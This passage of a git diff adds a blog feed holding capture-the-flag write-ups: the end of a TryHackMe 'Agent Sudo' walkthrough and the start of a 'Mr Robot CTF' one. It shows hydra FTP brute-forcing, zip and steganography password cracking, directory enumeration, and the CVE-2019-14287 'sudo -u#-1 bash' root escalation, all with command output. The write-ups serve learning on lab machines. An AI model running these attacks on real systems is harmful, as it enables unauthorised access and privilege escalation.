+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">title</span>&gt;Annoucement&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>	Dear agents,
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
+</span></span><span style="display:flex;"><span>	Use your own &lt;<span style="color:#f92672">b</span>&gt;codename&lt;/<span style="color:#f92672">b</span>&gt; as user-agent to access the site.
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
+</span></span><span style="display:flex;"><span>	From,&lt;<span style="color:#f92672">br</span>&gt;
+</span></span><span style="display:flex;"><span>	Agent R
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>We&rsquo;re greeted with a message from Agent R, instructing other agents to change their <code>user-agent</code> to thier codename for site access. Here I used <a href="https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/">User-Agent Switcher</a> to alter my requests. I began by trying to log in as the boss, chaning my user agent to &ldquo;R&rdquo;. Unfortunately, we&rsquo;re given a hostile response by the administrator (presumably R himself) for this request:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;   
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;What are you doing! Are you one of the 25 employees? If not, I going to report this incident
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">title</span>&gt;Annoucement&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>	Dear agents,
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
+</span></span><span style="display:flex;"><span>	Use your own &lt;<span style="color:#f92672">b</span>&gt;codename&lt;/<span style="color:#f92672">b</span>&gt; as user-agent to access the site.
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
+</span></span><span style="display:flex;"><span>	From,&lt;<span style="color:#f92672">br</span>&gt;
+</span></span><span style="display:flex;"><span>	Agent R
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span></code></pre></div><p>Likewise, user-agents <code>A</code> and <code>B</code> do not work, but <code>C</code> redirects us to <code>/agent_C_attention.php</code> on the web site:</p>
+<pre tabindex="0"><code>Attention ----s, &lt;br&gt;&lt;br&gt;
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! &lt;br&gt;&lt;br&gt;
+
+From,&lt;br&gt;
+Agent R
+</code></pre><p>Out of curiosity, I tried <code>J</code> as a user-agent, but that did not yield anything. However, now that we know about a user named <code>----s</code>, we should see if we can access the vsftpd FTP server on port 21. I chose to use <code>hydra</code> to attempt to brute force the server. This process went extremely slowly, unfortunately, with several disconnections from the remote host. I assume that this has to do with some form of rate limiting.</p>
+<pre tabindex="0"><code>┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
+└─$ hydra -t 1 -l ----s -P /usr/share/wordlists/rockyou.txt -vV 10.10.73.189 ftp
+Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-05-23 10:19:49
+[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
+[DATA] attacking ftp://10.10.73.189:21/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;123456&#34; - 1 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;12345&#34; - 2 of 14344400 [child 0] (0/1)
+[STATUS] 2.00 tries/min, 2 tries in 00:01h, 14344398 to do in 119536:40h, 1 active
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;123456789&#34; - 3 of 14344401 [child 0] (0/2)
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;password&#34; - 4 of 14344401 [child 0] (0/2)
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;iloveyou&#34; - 5 of 14344401 [child 0] (0/2)
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;princess&#34; - 6 of 14344401 [child 0] (0/2)
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;1234567&#34; - 7 of 14344401 [child 0] (0/2)
+
+... 🕒 two hours later 🕒 ...
+
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;cutie&#34; - 243 of 14344401 [child 0] (0/2)
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;james&#34; - 244 of 14344401 [child 0] (0/2)
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;banana&#34; - 245 of 14344401 [child 0] (0/2)
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;prince&#34; - 246 of 14344401 [child 0] (0/2)
+[STATUS] 7.94 tries/min, 246 tries in 00:31h, 14344155 to do in 30126:37h, 1 active
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;friend&#34; - 247 of 14344401 [child 0] (0/2)
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;jesus1&#34; - 248 of 14344401 [child 0] (0/2)
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;------l&#34; - 249 of 14344401 [child 0] (0/2)
+[21][ftp] host: 10.10.73.189   login: ----s   password: ------l
+[STATUS] attack finished for 10.10.73.189 (waiting for children to complete tests)
+</code></pre><p>We test out our new credentials and discover three files on the FTP server that we can get. We download the text message first.</p>
+<pre tabindex="0"><code>┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
+└─$ ftp 10.10.73.189 
+Connected to 10.10.73.189.
+220 (vsFTPd 3.0.3)
+Name (10.10.73.189:virtualtack): ----s
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||20720|)
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
+-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
+-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
+226 Directory send OK.
+ftp&gt; get To_agentJ.txt
+local: To_agentJ.txt remote: To_agentJ.txt
+229 Entering Extended Passive Mode (|||35196|)
+150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
+100% |************|   217       75.79 KiB/s    00:00 ETA
+226 Transfer complete.
+217 bytes received in 00:00 (1.69 KiB/s)
+ftp&gt; exit
+221 Goodbye.                                                    
+</code></pre><p><code>To_agentJ.txt</code></p>
+<pre tabindex="0"><code>Dear agent J,
+
+All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn&#39;t be a problem for you.
+
+From,
+Agent C
+</code></pre><p>Good to know! Let&rsquo;s grab the image files and figure out how to extract Agent J&rsquo;s login password.</p>
+<pre tabindex="0"><code>┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
+└─$ ftp 10.10.73.189 
+Connected to 10.10.73.189.
+220 (vsFTPd 3.0.3)
+Name (10.10.73.189:virtualtack): ----s
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||27749|)
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
+-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
+-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
+226 Directory send OK.
+ftp&gt; get cute-alien.jpg
+local: cute-alien.jpg remote: cute-alien.jpg
+229 Entering Extended Passive Mode (|||13011|)
+150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
+100% |************| 33143      308.57 KiB/s    00:00 ETA
+226 Transfer complete.
+33143 bytes received in 00:00 (154.69 KiB/s)
+ftp&gt; get cutie.png
+local: cutie.png remote: cutie.png
+229 Entering Extended Passive Mode (|||63920|)
+150 Opening BINARY mode data connection for cutie.png (34842 bytes).
+100% |************| 34842      322.63 KiB/s    00:00 ETA
+226 Transfer complete.
+34842 bytes received in 00:00 (158.37 KiB/s)
+ftp&gt; quit
+221 Goodbye.
+</code></pre><p>I should have used <code>mget *</code> here instead. Looking at the two images, I don&rsquo;t see anything immediately interesting. They are cute, though.</p>
+<p>I spent a while viewing the files but don&rsquo;t get anywhere. So I consult the internet. Turns out the clever agents hid a text string inside a data file <a href="https://www.howtogeek.com/427805/how-to-use-the-strings-command-on-linux/">you can do this with binaries, too</a>. Apparently everyone on the internet uses <code>binwalk</code> for this scenario. <a href="https://www.kali.org/tools/binwalk/">Binwalk</a> is a tool for searching a given binary image for embedded files and executable code. Specifically, it is designed for identifying files and code embedded inside of firmware images. They must teach this stuff at spy school.</p>
+<p>Let&rsquo;s binwalk&hellip;</p>
+<pre tabindex="0"><code>┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
+└─$ binwalk cutie.png
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
+869           0x365           Zlib compressed data, best compression
+34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
+34820         0x8804          End of Zip archive, footer length: 22
+</code></pre><p><code>binwalk</code>, in its omnipotence, has a function to extract known file types, using the <code>-e</code> flag.</p>
+<p>We also now have the extracted contents of <code>cutie.png</code></p>
+<pre tabindex="0"><code>┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
+└─$ ls
+365  365.zlib  8702.zip  To_agentR.txt
+</code></pre><p>Let&rsquo;s unzip the archive:</p>
+<pre tabindex="0"><code>┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
+└─$ 7z x 8702.zip
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-7700K CPU @ 4.20GHz (906E9),ASM,AES-NI)
+
+Scanning the drive for archives:
+1 file, 280 bytes (1 KiB)
+
+Extracting archive: 8702.zip
+--
+Path = 8702.zip
+Type = zip
+Physical Size = 280
+
+    
+Enter password (will not be echoed):
+ERROR: Wrong password : To_agentR.txt
+                    
+Sub items Errors: 1
+
+Archives with Errors: 1
+
+Sub items Errors: 1
+</code></pre><p>Usually <code>zip</code> passwords are pretty easy to break in CTFs. Let&rsquo;s see if that&rsquo;s true here:</p>
+<pre tabindex="0"><code>┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
+└─$ zip2john 8702.zip &gt; 4john
+                                                                    
+┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
+└─$ ls
+365  365.zlib  4john  8702.zip  To_agentR.txt
+
+──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
+└─$ john 4john
+Using default input encoding: UTF-8
+Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
+Cost 1 (HMAC size) is 78 for all loaded hashes
+Will run 4 OpenMP threads
+Proceeding with single, rules:Single
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+----n            (8702.zip/To_agentR.txt)     
+1g 0:00:00:00 DONE 2/3 (2022-05-23 11:42) 1.587g/s 72174p/s 72174c/s 72174C/s 123456..ferrises
+Use the &#34;--show&#34; option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre><p>It is true. Now we can use <code>----n</code> to access the archive and read the contents of <code>To_agentR.txt</code>.</p>
+<pre tabindex="0"><code>Agent C,
+
+We need to send the picture to &#39;-------x&#39; as soon as possible!
+
+By,
+Agent R
+</code></pre><p>As the result of doing a few CTFs, the name of the picture recipient looks suspiciously like it is encoded in base64. As a reminder: <strong>base64 is not encryption</strong>. This is apparently a <a href="https://twitter.com/sempf/status/988525614444539904">big deal</a> <a href="https://github.com/sethvargo/base64-is-not-encryption">for kubernetes folks</a>.</p>
+<pre tabindex="0"><code>┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
+└─$ touch -------x.txt
+                                                                    
+┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
+└─$ vim -------x.txt
+                                                                    
+┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
+└─$ base64 -d &#39;-------x.txt&#39;
+-----1   
+</code></pre><p>Reading other write-ups after finishing the box, I learned about <a href="https://gchq.github.io/CyberChef/">Cyber Chef</a> which looks great for stuff like this in the future.</p>
+<p>The next prompt on THM asks for the <code>steg password</code>. I don&rsquo;t know what that is, so I search for it and <a href="https://www.kali.org/tools/stegcracker/">stegcracker</a> tops the list. Let&rsquo;s try it, in conjunction with our remaining alien image <code>cute-alien.jpg</code></p>
+<pre tabindex="0"><code>┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
+└─$ stegcracker cute-alien.jpg
+StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
+Copyright (c) 2022 - Luke Paris (Paradoxis)
+
+StegCracker has been retired following the release of StegSeek, which 
+&#34;steghidewill blast through the rockyou.txt wordlist within 1.9 second as opposed to StegCracker which takes ~5 hours.
+
+StegSeek can be found at: https://github.com/RickdeJager/stegseek
+
+No wordlist was specified, using default rockyou.txt wordlist.
+Counting lines in wordlist..
+Attacking file &#39;cute-alien.jpg&#39; with wordlist &#39;/usr/share/wordlists/rockyou.txt&#39;..
+</code></pre><p>Next time, I will definitely try <a href="https://github.com/RickdeJager/stegseek">StegSeek</a>! This is going insanely slowly, so I think it&rsquo;s probably not the right way to go. However, the ftp brute-force above took ages too. I&rsquo;ll let it run in the background while I google other steg stuff.</p>
+<p>I learned about <a href="https://wiki.bi0s.in/steganography/stegsolve/">Stegsolve</a> which is a really cool little utility, but, sadly, not helpful here. The next thing to try is <a href="https://www.kali.org/tools/steghide/">steghide</a>:</p>
+<pre tabindex="0"><code>                                                         
+┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
+└─$ steghide --extract -sf cute-alien.jpg
+Enter passphrase: 
+wrote extracted data to &#34;message.txt&#34;.
+                                                         
+┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
+└─$ cat message.txt
+Hi ----s,
+
+Glad you find this message. Your login password is hackerrules!
+
+Don&#39;t ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+----s
+</code></pre><p>Coincidentally, the lethargic StegCracker process also just finished, giving us another route to the message.</p>
+<pre tabindex="0"><code>┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
+└─$ stegcracker cute-alien.jpg
+StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
+Copyright (c) 2022 - Luke Paris (Paradoxis)
+
+StegCracker has been retired following the release of StegSeek, which 
+will blast through the rockyou.txt wordlist within 1.9 second as opposed 
+to StegCracker which takes ~5 hours.
+
+StegSeek can be found at: https://github.com/RickdeJager/stegseek
+
+No wordlist was specified, using default rockyou.txt wordlist.
+Counting lines in wordlist..
+Attacking file &#39;cute-alien.jpg&#39; with wordlist &#39;/usr/share/wordlists/rockyou.txt&#39;..
+Successfully cracked file with password: -----1doro1111
+Tried 441203 passwords
+Your file has been written to: cute-alien.jpg.out
+-----1
+                                                         
+┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
+└─$ cat cute-alien.jpg.out
+Hi ----s,
+
+Glad you find this message. Your login password is hackerrules!
+
+Don&#39;t ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+----s    
+</code></pre><p>Let&rsquo;s log in via <code>ssh</code> and find our user flag.</p>
+<pre tabindex="0"><code>┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
+└─$ ssh ----s@10.10.108.206
+----s@10.10.108.206&#39;s password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon May 23 16:28:05 UTC 2022
+
+  System load:  1.07              Processes:           99
+  Usage of /:   39.8% of 9.78GB   Users logged in:     0
+  Memory usage: 19%               IP address for eth0: 10.10.108.206
+  Swap usage:   0%
+
+
+75 packages can be updated.
+33 updates are security updates.
+
+
+Last login: Tue Oct 29 14:26:27 2019
+----s@agent-sudo:~$ ls
+Alien_autospy.jpg  user_flag.txt
+----s@agent-sudo:~$ cat user_flag.txt
+🎌`user flag`🎌
+----s@agent-sudo:~$ 
+</code></pre><p>While the secret agents certainly have more knowledge about image-based cryptography, I spot that they&rsquo;ve misspelled &ldquo;autopsy&rdquo; in the image file name, which, despite being a tiny victory helps my ego.</p>
+<p>Now let&rsquo;s try to get root. First, I check to see what our friend <code>----s</code> has <code>sudo</code> permissions to run:</p>
+<pre tabindex="0"><code>----s@agent-sudo:~$ sudo -l
+[sudo] password for ----s: 
+Matching Defaults entries for ----s on agent-sudo:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User ----s may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+</code></pre><p>Well, that is lucky. I immediately google this command and discover CVE-2019-14287. This exploit works due to some remarkably simple logic. The security policy applied – which allows <code>----s</code> to run <code>bash</code> as any user except root – is quite sensible. However, unfortunately, <code>sudo</code> faithfully interprets <code>#-1</code> after the <code>-u</code> user flag and, upon checking for user number <code>-1</code>,  will run as user <code>0</code>: <code>root</code>.</p>
+<pre tabindex="0"><code>----s@agent-sudo:~$ sudo -u#-1 bash
+root@agent-sudo:~# whoami
+root
+</code></pre><p>This can also be done with <code>4294967295</code> instead of <code>-u</code>. h/t <a href="https://www.whitesourcesoftware.com/resources/blog/new-vulnerability-in-sudo-cve-2019-14287/">WhiteSource</a></p>
+<pre tabindex="0"><code>----s@agent-sudo:~$ sudo -u#4294967295 bash
+[sudo] password for ----s: 
+root@agent-sudo:~# whoami
+root
+</code></pre><p>Pretty crazy!</p>
+<p>Now for the final spy message of the box:</p>
+<pre tabindex="0"><code>root@agent-sudo:/# cd /root
+root@agent-sudo:/root# ls
+root.txt
+root@agent-sudo:/root# cat root.txt
+To Mr.hacker,
+
+Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
+
+Your flag is 
+🎌root flag🎌
+
+By,
+-----l a.k.a Agent R
+</code></pre><h3 id="lessons-learned">Lessons Learned</h3>
+<p>I learned a lot from this box and enjoyed it a lot. In particular, I think building a familiarity with <code>binwalk</code> and the various tricks and utilities related to <a href="https://en.wikipedia.org/wiki/Steganography">steganography</a> - concealing data in other data or objects - will be useful down the road. Understanding and using CVE-2019-14287 was quite helpful, as well.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>THM: Mr Robot CTF -- Write-Up</title>
+            <link>https://robscharf.github.io/posts/2022/05/thm-mr-robot-ctf--write-up/</link>
+            <pubDate>Tue, 10 May 2022 23:14:00 +0000</pubDate>
+            
+            <guid>https://robscharf.github.io/posts/2022/05/thm-mr-robot-ctf--write-up/</guid>
+            <description>About TryHackMe.com&amp;rsquo;s Mr Robot CTF (MRCTF) is a beginner-friendly capture-the-flag virtual machine by Leon Johnson. MRCTF is named after, and inspired by, the Mr. Robot television show and challenges users to capture three flags by finding vulnerabilities in the target server and exploiting them to gain root access.
+Note I have replaced all instances of the virtual machine&amp;rsquo;s ip address with &amp;lt;target-ip&amp;gt; throughout this write-up.
+Methodology We begin our enumeration efforts by running an nmap scan on the target machine to understand the ports that are open to network traffic.</description>
+            <content type="html"><![CDATA[<h2 id="about">About</h2>
+<p><a href="https://tryhackme.com/">TryHackMe.com</a>&rsquo;s <a href="https://tryhackme.com/room/mrrobot">Mr Robot CTF (MRCTF)</a> is a beginner-friendly capture-the-flag virtual machine by <a href="https://twitter.com/@sho_luv">Leon Johnson</a>. MRCTF is named after, and inspired by, the <a href="https://en.wikipedia.org/wiki/Mr._Robot">Mr. Robot</a> television show and challenges users to capture three flags by finding vulnerabilities in the target server and exploiting them to gain root access.</p>
+<h3 id="note">Note</h3>
+<p>I have replaced all instances of the virtual machine&rsquo;s ip address with <code>&lt;target-ip&gt;</code> throughout this write-up.</p>
+<h2 id="methodology">Methodology</h2>
+<p>We begin our enumeration efforts by running an <code>nmap</code> scan on the target machine to understand the ports that are open to network traffic. I usually begin with the TCP SYN &ldquo;Stealth&rdquo; Scan (-sS) with &ldquo;version dection&rdquo; (<code>-V</code>) enabled. Here is a <a href="https://nmap.org/book/port-scanning-options.html">list of general <code>nmap</code> CLI flags</a>.</p>
+<pre tabindex="0"><code>nmap sudo nmap -sV -v &lt;target-ip&gt;
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-10 12:12 EDT
+NSE: Loaded 45 scripts for scanning.
+Initiating Ping Scan at 12:12
+Scanning &lt;target-ip&gt; [4 ports]
+Completed Ping Scan at 12:12, 0.19s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 12:12
+Completed Parallel DNS resolution of 1 host. at 12:12, 0.01s elapsed
+Initiating SYN Stealth Scan at 12:12
+Scanning &lt;target-ip&gt; [1000 ports]
+Discovered open port 443/tcp on &lt;target-ip&gt;
+Discovered open port 80/tcp on &lt;target-ip&gt;
+Completed SYN Stealth Scan at 12:12, 9.83s elapsed (1000 total ports)
+Initiating Service scan at 12:12
+Scanning 2 services on &lt;target-ip&gt;
+Completed Service scan at 12:13, 12.92s elapsed (2 services on 1 host)
+NSE: Script scanning &lt;target-ip&gt;.
+Initiating NSE at 12:13
+Completed NSE at 12:13, 2.82s elapsed
+Initiating NSE at 12:13
+Completed NSE at 12:13, 1.27s elapsed
+Nmap scan report for &lt;target-ip&gt;
+Host is up (0.15s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT    STATE  SERVICE  VERSION
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+443/tcp open   ssl/http Apache httpd
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.44 seconds
+           Raw packets sent: 2007 (88.284KB) | Rcvd: 10 (416B)
+</code></pre><p>From this, we learn that an <code>Apache</code> instance is active on the standard ports, while an ssh server is running on port 22 - though it is closed to network traffic.</p>
+<p>Next, we use <code>gobuster</code>, <a href="https://github.com/OJ/gobuster">a popular tool</a> that facilitates brute-force enumeration. Here, we use it in directory mode (<code>dir</code>) with a popular directory names wordlist (<code>-w</code>) against our <code>&lt;target-ip&gt;</code> with (<code>-u</code>).</p>
+<pre tabindex="0"><code>gobuster dir -w /usr/share/wordlists/dirb/common.txt -u &lt;target-ip&gt;
+
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://&lt;target-ip&gt;
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/05/10 12:13:27 Starting gobuster in directory enumeration mode
+===============================================================
+
+/.hta                 (Status: 403) [Size: 213]
+
+/.htaccess            (Status: 403) [Size: 218]
+
+/.htpasswd            (Status: 403) [Size: 218]
+
+/0                    (Status: 301) [Size: 0] [--&gt; http://&lt;target-ip&gt;/0/]
+
+/admin                (Status: 301) [Size: 235] [--&gt; http://&lt;target-ip&gt;/admin/]
+
+/atom                 (Status: 301) [Size: 0] [--&gt; http://&lt;target-ip&gt;/feed/atom/]
+
+/audio                (Status: 301) [Size: 235] [--&gt; http://&lt;target-ip&gt;/audio/]  
+
+/blog                 (Status: 301) [Size: 234] [--&gt; http://&lt;target-ip&gt;/blog/]   
+
+/css                  (Status: 301) [Size: 233] [--&gt; http://&lt;target-ip&gt;/css/]    
+
+/dashboard            (Status: 302) [Size: 0] [--&gt; http://&lt;target-ip&gt;/wp-admin/] 
+
+/favicon.ico          (Status: 200) [Size: 0]                                      
+
+/feed                 (Status: 301) [Size: 0] [--&gt; http://&lt;target-ip&gt;/feed/]     
+
+/image                (Status: 301) [Size: 0] [--&gt; http://&lt;target-ip&gt;/image/]    
+
+/Image                (Status: 301) [Size: 0] [--&gt; http://&lt;target-ip&gt;/Image/]    
+
+/images               (Status: 301) [Size: 236] [--&gt; http://&lt;target-ip&gt;/images/] 
+
+/index.html           (Status: 200) [Size: 1188]                                   
+
+/index.php            (Status: 301) [Size: 0] [--&gt; http://&lt;target-ip&gt;/]          
+
+/intro                (Status: 200) [Size: 516314]                                 
+
+/js                   (Status: 301) [Size: 232] [--&gt; http://&lt;target-ip&gt;/js/]     
+
+/license              (Status: 200) [Size: 309]                                    
+
+/login                (Status: 302) [Size: 0] [--&gt; http://&lt;target-ip&gt;/wp-login.php]
+
+/page1                (Status: 301) [Size: 0] [--&gt; http://&lt;target-ip&gt;/]            
+
+/phpmyadmin           (Status: 403) [Size: 94]                                       
+
+/readme               (Status: 200) [Size: 64]                                       
+
+/rdf                  (Status: 301) [Size: 0] [--&gt; http://&lt;target-ip&gt;/feed/rdf/]   
+
+/robots               (Status: 200) [Size: 41]                                       
+
+/robots.txt           (Status: 200) [Size: 41]                                       
+
+/rss                  (Status: 301) [Size: 0] [--&gt; http://&lt;target-ip&gt;/feed/]       
+
+/rss2                 (Status: 301) [Size: 0] [--&gt; http://&lt;target-ip&gt;/feed/]       
+
+/sitemap              (Status: 200) [Size: 0]                                        
+
+/sitemap.xml          (Status: 200) [Size: 0]                                        
+
+/video                (Status: 301) [Size: 235] [--&gt; http://&lt;target-ip&gt;/video/]    
+
+/wp-admin             (Status: 301) [Size: 238] [--&gt; http://&lt;target-ip&gt;/wp-admin/] 
+
+/wp-content           (Status: 301) [Size: 240] [--&gt; http://&lt;target-ip&gt;/wp-content/]
+
+/wp-includes          (Status: 301) [Size: 241] [--&gt; http://&lt;target-ip&gt;/wp-includes/]
+
+/wp-cron              (Status: 200) [Size: 0]                                          
+
+/wp-config            (Status: 200) [Size: 0]                                          
+
+/wp-links-opml        (Status: 200) [Size: 227]                                        
+
+/wp-load              (Status: 200) [Size: 0]                                          
+
+/wp-login             (Status: 200) [Size: 2613]                                       
+
+/wp-mail              (Status: 500) [Size: 3064]                                       
+
+/wp-settings          (Status: 500) [Size: 0]                                          
+
+/wp-signup            (Status: 302) [Size: 0] [--&gt; http://&lt;target-ip&gt;/wp-login.php?action=register]
+
+/xmlrpc               (Status: 405) [Size: 42]                                                       
+
+/xmlrpc.php           (Status: 405) [Size: 42]                                                       
+===============================================================
+2022/05/10 12:24:21 Finished
+===============================================================
+</code></pre><p>From this, we can be confident that WordPress is installed. This also mirrors what <a href="">Wappalyzer</a> tells us about the server&rsquo;s WordPress installation. Let&rsquo;s investigate some of the more interesting results from our <code>gobuster</code> scan.</p>
+<p>Visiting <code>http://&lt;target-ip&gt;/robots.txt</code> yields:</p>
+<pre tabindex="0"><code>User-agent: *
+fsocity.dic
+key-1-of-3.txt
+</code></pre><p><code>fsocity.dic</code> is a dictionary wordlist file with many entries. This most likely contains the username and/or password of the WordPress installation.</p>
+<p><code>key-1-of-3.txt</code> has our first flag.</p>
+<p><code>http://&lt;target-ip&gt;/license</code> gives us a text file with the following string hidden at the bottom. At first flance, the string looks a lot like <code>base64</code>, so let us try to convert it. This could be done via websites like <a href="https://www.base64decode.org/">www.base64.decode.org</a>, but I already had Burp Suite open. It works:</p>
+<p><img src="/images/mr-robot/mr-robot-burp-decode.png" alt="mr-robot-burp-decode"></p>
+<p>and gives us a <code>user:password</code> combination.</p>
